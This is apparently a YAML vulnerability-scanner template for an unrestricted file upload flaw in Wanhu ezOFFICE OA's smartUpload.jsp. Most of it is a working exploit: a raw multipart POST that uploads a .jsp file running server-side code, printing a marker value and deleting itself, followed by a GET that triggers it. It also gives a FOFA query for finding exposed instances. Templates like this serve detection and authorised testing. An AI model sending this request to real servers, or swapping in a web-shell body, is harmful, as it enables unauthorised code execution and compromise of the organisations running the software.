http:
- extractors:
  - internal: true
    name: uploadfile
    part: body
    regex:
    - \d{25}\.jsp
    type: regex
  matchers:
  - part: body
    type: word
    words:
    - '2468642'
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - "POST /defaultroot/extension/smartUpload.jsp?path=information&mode=add&fileName=infoPicName&saveName=infoPicSaveName&tableName=infoPicTable&fileMaxSize=0&fileMaxNum=0&fileType=gif,jpg,bmp,jsp,png&fileMinWidth=0&fileMinHeight=0&fileMaxWidth=0&fileMaxHeight=0\
    \ HTTP/1.1\nHost: {{Hostname}}\nCache-Control: max-age=0\nUpgrade-Insecure-Requests:\
    \ 1\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundarynNQ8hoU56tfSwBVU\n\
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\n\
    Accept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6\n\
    Connection: close\n\n------WebKitFormBoundarynNQ8hoU56tfSwBVU\nContent-Disposition:\
    \ form-data; name=\"photo\"; filename=\"{{filename}}\"\nContent-Type: application/octet-stream\n\
    \n<% out.print(1111*2222);new java.io.File(application.getRealPath(request.getServletPath())).delete();\
    \ %>\n------WebKitFormBoundarynNQ8hoU56tfSwBVU\nContent-Disposition: form-data;\
    \ name=\"continueUpload\"\n\n1\n------WebKitFormBoundarynNQ8hoU56tfSwBVU\nContent-Disposition:\
    \ form-data; name=\"submit\"\n\n\u4E0A\u4F20\u7EE7\u7EED\n------WebKitFormBoundarynNQ8hoU56tfSwBVU--\n"
  - 'GET /defaultroot/upload/information/{{uploadfile}} HTTP/1.1

    Host: {{Hostname}}

    '
id: wanhu-smartupload-fileupload
info:
  author: Co5mos
  description: There is a file upload interface in the smartUpload.jsp file of Wanhu
    OA, and there is no filtering on the file type, which leads to arbitrary file
    upload vulnerability.
  metadata:
    fofa-query: "app=\"\u4E07\u6237\u7F51\u7EDC-ezOFFICE\""
    max-request: 2
  name: Wanhub - Arbitrary File Upload
  reference:
  - https://peiqi.wgpsec.org/wiki/oa/%E4%B8%87%E6%88%B7OA/%E4%B8%87%E6%88%B7OA%20smartUpload.jsp%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.html
  severity: critical
  tags: wanhu,fileupload
variables:
  filename: '{{rand_base(5)}}.jsp'
